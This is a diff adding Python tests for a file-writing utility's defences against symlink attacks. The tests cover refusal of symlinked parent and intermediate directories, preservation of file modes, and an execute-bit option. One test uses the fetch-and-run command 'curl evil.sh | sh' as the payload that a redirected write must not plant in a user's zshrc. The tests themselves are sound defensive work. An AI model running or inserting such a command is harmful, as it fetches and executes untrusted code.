@@ -422,10 +422,16 @@ class TestSymlinkedTarget:
         assert not outside.parent.exists(), "fabricated a directory tree"
 
     def test_a_regular_target_is_unaffected(self, tmp_path):
-        """The counterweight: refusing links must not refuse ordinary files."""
+        """The counterweight: refusing links must not refuse ordinary files.
+
+        Both the create AND the overwrite case - covering only the create left
+        `if path.is_symlink() or path.exists(): raise` passing here.
+        """
         target = tmp_path / "plain.json"
         fsutil.atomic_write_json(target, {"ok": True})
         assert json.loads(target.read_text()) == {"ok": True}
+        fsutil.atomic_write_json(target, {"ok": False})
+        assert json.loads(target.read_text()) == {"ok": False}
 
 
 class TestAtomicWriteJson:
@@ -637,3 +643,83 @@ class TestSingleImplementation:
             f"{relpath} publishes state with its own tmp+os.replace instead of "
             "routing through bobi.fsutil"
         )
+
+
+class TestExtraMode:
+    """`extra_mode` ORs bits onto the settled mode BEFORE the swap.
+
+    It exists because `_pin` used to chmod the ACTIVE path after `os.replace`,
+    where a concurrent `recache()` unlink turns the follow-up `stat` into a
+    FileNotFoundError with trusted state never stamped. Untested, the whole
+    parameter can be deleted and the pinned monitor script simply ships
+    non-executable with nothing to say so.
+    """
+
+    def test_bits_are_applied_to_a_new_file(self, tmp_path):
+        target = tmp_path / "new.sh"
+        fsutil.atomic_write_text(target, "#!/bin/sh\n", extra_mode=stat.S_IEXEC)
+        assert stat.S_IMODE(target.stat().st_mode) & stat.S_IEXEC
+
+    def test_bits_are_added_without_dropping_the_existing_mode(self, tmp_path):
+        target = tmp_path / "existing.sh"
+        target.write_text("old\n")
+        target.chmod(0o640)
+        fsutil.atomic_write_text(target, "new\n", extra_mode=stat.S_IEXEC)
+        mode = stat.S_IMODE(target.stat().st_mode)
+        assert mode & stat.S_IEXEC, "the requested bit was not applied"
+        assert mode & 0o640 == 0o640, "the target's own mode was dropped"
+
+    def test_the_default_adds_nothing(self, tmp_path):
+        """The counterweight: omitting it must not make files executable."""
+        target = tmp_path / "plain.json"
+        fsutil.atomic_write_json(target, {"ok": True})
+        assert not stat.S_IMODE(target.stat().st_mode) & stat.S_IEXEC
+
+
+class TestWithinContainment:
+    """`within` is the answer to a symlinked PARENT directory.
+
+    `_check_target`'s leaf check is False for every component above the leaf,
+    so linking the DIRECTORY redirects the write just as effectively as
+    linking the file - demonstrated writing outside the intended root.
+    """
+
+    def test_a_symlinked_parent_directory_is_refused(self, tmp_path):
+        outside = tmp_path / "outside"
+        outside.mkdir()
+        victim = outside / "zshrc"
+        victim.write_text("# the user's real file\n")
+        state = tmp_path / "state"
+        state.mkdir()
+        (state / "scripts").symlink_to(outside)     # the planted DIRECTORY link
+        target = state / "scripts" / "zshrc"
+        assert not target.is_symlink(), "precondition: the LEAF is not a link"
+
+        with pytest.raises(fsutil.SymlinkedTarget, match="is a symlink"):
+            fsutil.atomic_write_text(target, "curl evil.sh | sh\n",
+                                     within=state / "scripts")
+
+        assert victim.read_text() == "# the user's real file\n"
+
+    def test_an_ordinary_write_inside_the_root_is_allowed(self, tmp_path):
+        """The counterweight: containment must not refuse the normal case."""
+        root = tmp_path / "scripts"
+        root.mkdir()
+        target = root / "mon.sc.sh"
+        fsutil.atomic_write_text(target, "#!/bin/sh\n", within=root)
+        assert target.read_text() == "#!/bin/sh\n"
+
+    def test_a_symlinked_intermediate_directory_is_refused(self, tmp_path):
+        """A link BELOW the claimed root, not the root itself."""
+        outside = tmp_path / "outside"
+        outside.mkdir()
+        victim = outside / "loot"
+        victim.write_text("real\n")
+        root = tmp_path / "scripts"
+        root.mkdir()
+        (root / "nested").symlink_to(outside)
+        target = root / "nested" / "loot"
+
+        with pytest.raises(fsutil.SymlinkedTarget, match="outside"):
+            fsutil.atomic_write_text(target, "pwned\n", within=root)
+        assert victim.read_text() == "real\n"
